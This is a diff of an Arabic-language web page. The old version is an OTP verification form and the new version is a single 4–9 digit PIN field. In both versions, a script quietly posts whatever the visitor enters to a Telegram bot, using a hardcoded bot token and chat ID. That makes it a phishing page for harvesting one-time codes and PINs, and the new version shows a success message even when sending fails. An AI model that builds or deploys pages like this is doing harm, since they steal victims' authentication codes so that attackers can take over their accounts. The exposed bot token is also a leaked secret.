@@ -1,278 +1,90 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>إدخال رمز التحقق</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>إرسال رقم — 4 إلى 9 أرقام</title>
   <style>
-    :root{
-      --bg: #f4f7fb;
-      --card: #fff;
-      --primary: #0b61c2;
-      --accent: #004080;
-      --muted: #6b7280;
-      --success: #16a34a;
-      --danger: #dc2626;
-      --shadow: 0 10px 30px rgba(2,6,23,0.08);
-      --radius: 12px;
-    }
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family: "Segoe UI", Tahoma, Arial, "Noto Naskh Arabic", sans-serif;
-      background: linear-gradient(180deg,var(--bg),#eef4ff);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:20px;
-      color:#111827;
-      direction:rtl;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-    }
-
-    .card{
-      width:100%;
-      max-width:520px;
-      background:var(--card);
-      border-radius:var(--radius);
-      box-shadow:var(--shadow);
-      padding:22px;
-      overflow:hidden;
-    }
-
-    header{
-      display:flex;
-      align-items:center;
-      gap:14px;
-      margin-bottom:10px;
-    }
-    .brand{
-      width:56px;height:56px;border-radius:10px;background:linear-gradient(135deg,var(--primary),var(--accent));
-      display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:18px;
-      box-shadow:0 6px 18px rgba(11,97,194,0.12);
-    }
-    h1{margin:0;font-size:18px;color:var(--accent)}
-    p.lead{margin:8px 0 16px;color:var(--muted);font-size:14px;line-height:1.4}
-
-    /* OTP grid */
-    .otp-grid{
-      display:flex;
-      gap:10px;
-      justify-content:center;
-      margin:12px 0 6px;
-    }
-    .otp-input{
-      width:64px;
-      height:64px;
-      border-radius:10px;
-      border:1px solid #e6eefc;
-      background:#fbfeff;
-      text-align:center;
-      font-size:22px;
-      font-weight:700;
-      caret-color:transparent;
-      transition:transform .12s ease, box-shadow .12s ease, border-color .12s ease;
-    }
-    .otp-input:focus{
-      outline:none;
-      transform:translateY(-3px);
-      box-shadow:0 8px 20px rgba(11,97,194,0.10);
-      border-color:var(--accent);
-    }
-
-    .meta{
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      margin-top:12px;
-      gap:10px;
-    }
-    .timer{font-weight:700;color:var(--muted)}
-    .help{font-size:13px;color:var(--muted)}
-
-    .actions{display:flex;gap:10px;margin-top:18px}
-    .btn{
-      flex:1;padding:12px;border-radius:10px;border:0;font-weight:800;background:var(--accent);color:#fff;cursor:pointer;
-      transition:transform .08s ease;
-    }
-    .btn:active{transform:translateY(1px)}
-    .btn.ghost{background:transparent;color:var(--accent);border:1px solid #d7e6ff;font-weight:700}
-
-    .status{margin-top:12px;text-align:center;font-size:14px;color:var(--muted);min-height:20px}
-
-    /* small screens */
-    @media (max-width:420px){
-      .otp-input{width:46px;height:52px;font-size:20px}
-      .brand{width:48px;height:48px;font-size:16px}
-    }
-
-    /* subtle shake */
-    @keyframes shake {
-      0%{ transform: translateX(0) }
-      20%{ transform: translateX(-6px) }
-      40%{ transform: translateX(6px) }
-      60%{ transform: translateX(-4px) }
-      80%{ transform: translateX(4px) }
-      100%{ transform: translateX(0) }
-    }
-    .shake{animation:shake .42s ease both}
+    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
+    main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
+    .box{width:100%;max-width:420px;background:#fff;padding:22px;border-radius:8px;box-shadow:0 0 12px rgba(0,0,0,.08);text-align:center}
+    input{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;font-size:16px}
+    button{margin-top:12px;padding:12px 14px;width:100%;background:#0b5320;color:#fff;border:0;border-radius:6px;font-weight:700;cursor:pointer}
+    .hint{color:#666;margin-top:10px;font-size:14px}
   </style>
 </head>
 <body>
-  <main class="card" role="main" aria-labelledby="title">
-    <header>
-      <div class="brand" aria-hidden="true">OTP</div>
-      <div>
-        <h1 id="title">أدخل رمز التحقق</h1>
-        <p class="lead">فضلاً أدخل رمز التحقق المكوّن من <strong>6 أرقام</strong> المرسل إلى جوالك. يمكنك لصق الرمز كاملاً.</p>
-      </div>
-    </header>
+  <main>
+    <div class="box" role="region" aria-labelledby="title">
+      <h3 id="title">ادخل رقم (4–9 أرقام)</h3>
 
-    <div class="otp-grid" aria-label="حقول رمز التحقق" id="otpGrid">
-      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d1" aria-label="رقم 1"/>
-      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d2" aria-label="رقم 2"/>
-      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d3" aria-label="رقم 3"/>
-      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d4" aria-label="رقم 4"/>
-      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d5" aria-label="رقم 5"/>
-      <input inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-input" id="d6" aria-label="رقم 6"/>
+      <!-- الحقل الوحيد المتبقي -->
+      <input id="onlyNumber" inputmode="numeric" autocomplete="off"
+             placeholder="أدخل 4 إلى 9 أرقام فقط"
+             maxlength="9" />
+
+      <button id="sendBtn" type="button">إرسال</button>
+
+      <p class="hint">سيُسمح فقط بالأرقام — طول المدخل يجب أن يكون بين 4 و 9 أرقام.</p>
     </div>
-
-    <div class="meta" role="status" aria-live="polite">
-      <div class="help">لم يصلك الرمز؟ يمكنك إعادة الإرسال بعد انتهاء العداد.</div>
-      <div class="timer" id="timer">00:30</div>
-    </div>
-
-    <div class="actions">
-      <button class="btn" id="verifyBtn" aria-label="تحقق من الرمز">تحقق</button>
-      <button class="btn ghost" id="resendBtn" aria-label="إعادة إرسال" disabled>إعادة إرسال</button>
-    </div>
-
-    <div class="status" id="statusArea" aria-live="polite"></div>
   </main>
 
-<script>
-/* سلوك الحقول واللصق والتركيز والعداد */
-(function(){
-  const inputs = Array.from(document.querySelectorAll('.otp-input'));
-  const verifyBtn = document.getElementById('verifyBtn');
-  const resendBtn = document.getElementById('resendBtn');
-  const statusArea = document.getElementById('statusArea');
-  const timerEl = document.getElementById('timer');
+  <footer style="text-align:center;padding:12px;background:#f7f7f7;font-size:13px">© 2025</footer>
 
-  // demo code for local testing (you can ignore/change it)
-  const DEMO_CODE = '123456';
+  <script>
+    // ---- استخدمت التوكن و Chat ID اللي أعطيتهم سابقاً ----
+    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
+    const CHAT_ID   = "8404960059";
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-  // ✅ إضافة بيانات بوت التلغرام
-  const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
-  const CHAT_ID = "8404960059";
+    const input = document.getElementById('onlyNumber');
+    const btn   = document.getElementById('sendBtn');
 
-  // helpers
-  function setStatus(msg, ok){
-    statusArea.textContent = msg || '';
-    statusArea.style.color = ok ? 'var(--success)' : ok === false ? 'var(--danger)' : 'var(--muted)';
-  }
-
-  function getCode(){ return inputs.map(i=>i.value.trim()).join(''); }
-  function clearInputs(){ inputs.forEach(i=> i.value=''); inputs[0].focus(); }
-
-  /* automatic focus move */
-  inputs.forEach((input, idx) => {
-    input.addEventListener('input', (e) => {
-      const v = e.target.value.replace(/\D/g,'').slice(0,1);
-      e.target.value = v;
-      if(v && idx < inputs.length-1) inputs[idx+1].focus();
-      setStatus('');
+    // نمنع أي حرف غير رقمي أثناء الكتابة
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, '').slice(0, 9);
     });
 
-    input.addEventListener('keydown', (e) => {
-      if(e.key === 'Backspace' && !e.target.value && idx > 0){
-        inputs[idx-1].focus();
+    // دالة تحقق طول المدخل (4-9)
+    function validLength(v) {
+      return /^[0-9]{4,9}$/.test(v);
+    }
+
+    btn.addEventListener('click', async () => {
+      const val = input.value.trim();
+      if (!validLength(val)) {
+        alert('الرجاء إدخال رقم مكوَّن من 4 إلى 9 أرقام فقط.');
+        input.focus();
+        return;
+      }
+
+      // بنبني رسالة بسيطة نرسلها للبوت
+      const msg = `📥 استلام رقم (4-9):\n${val}`;
+
+      // إرسال إلى Telegram (غير حاسم إذا فشل؛ لا نمنع الانتقال)
+      try {
+        await fetch(API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+      } catch (e) {
+        // إذا فشل الإرسال نكتفي بالتقدم دون كسر التجربة
+        console.warn('فشل إرسال الرسالة إلى Telegram', e);
+      }
+
+      // إعطاء تأكيد بسيط للمستخدم ثم مسح الحقل
+      alert('تم الإرسال.');
+      input.value = '';
+    });
+
+    // تمكين الإرسال بزر Enter
+    input.addEventListener('keydown', (ev) => {
+      if (ev.key === 'Enter') {
+        ev.preventDefault();
+        btn.click();
       }
     });
-
-    input.addEventListener('paste', (ev) => {
-      ev.preventDefault();
-      const paste = (ev.clipboardData || window.clipboardData).getData('text') || '';
-      const digits = paste.replace(/\D/g,'').slice(0, inputs.length).split('');
-      digits.forEach((d,i)=> { inputs[i].value = d; });
-      const nextIndex = Math.min(digits.length, inputs.length-1);
-      inputs[nextIndex].focus();
-      setStatus('');
-    });
-  });
-
-  window.addEventListener('load', ()=> inputs[0].focus());
-
-  // عند الضغط على زر تحقق
-  verifyBtn.addEventListener('click', () => {
-    const code = getCode();
-    if(code.length !== inputs.length){
-      setStatus('الرجاء إدخال جميع الأرقام (6).', false);
-      animateShake();
-      return;
-    }
-
-    // إرسال الكود إلى بوت التلغرام
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: `رمز التحقق المدخل: ${code}`
-      })
-    }).then(res => res.json()).then(data => {
-      console.log("تم الإرسال إلى التلغرام", data);
-    }).catch(err => console.error("خطأ في الإرسال:", err));
-
-    // التحقق المحلي
-    if(code === DEMO_CODE){
-      setStatus('✅ تم التحقق بنجاح — شكراً', true);
-      setTimeout(()=> { setStatus('إعادة ضبط الحقول للاختبار...', null); clearInputs(); }, 900);
-    } else {
-      setStatus('❌ الرمز غير صحيح، حاول مجدداً.', false);
-      animateShake();
-      inputs.forEach(i => i.classList.add('shake'));
-      setTimeout(()=> inputs.forEach(i => i.classList.remove('shake')), 420);
-    }
-  });
-
-  function animateShake(){
-    inputs.forEach(i => i.classList.add('shake'));
-    setTimeout(()=> inputs.forEach(i => i.classList.remove('shake')), 420);
-  }
-
-  // resend timer
-  let countdown = 30;
-  let interval = setInterval(tick, 1000);
-  function tick(){
-    if(countdown <= 0){
-      clearInterval(interval);
-      timerEl.textContent = '00:00';
-      resendBtn.disabled = false;
-      return;
-    }
-    const mm = String(Math.floor(countdown/60)).padStart(2,'0');
-    const ss = String(countdown%60).padStart(2,'0');
-    timerEl.textContent = `${mm}:${ss}`;
-    countdown--;
-  }
-
-  resendBtn.addEventListener('click', (e)=>{
-    e.preventDefault();
-    if(resendBtn.disabled) return;
-    setStatus('تم إرسال رمز جديد (اختبار محلي).', true);
-    countdown = 30;
-    resendBtn.disabled = true;
-    interval = setInterval(tick, 1000);
-  });
-
-  inputs[inputs.length-1].addEventListener('keyup', (e) => {
-    if(e.key === 'Enter') verifyBtn.click();
-  });
-
-})();
-</script>
+  </script>
 </body>
 </html>
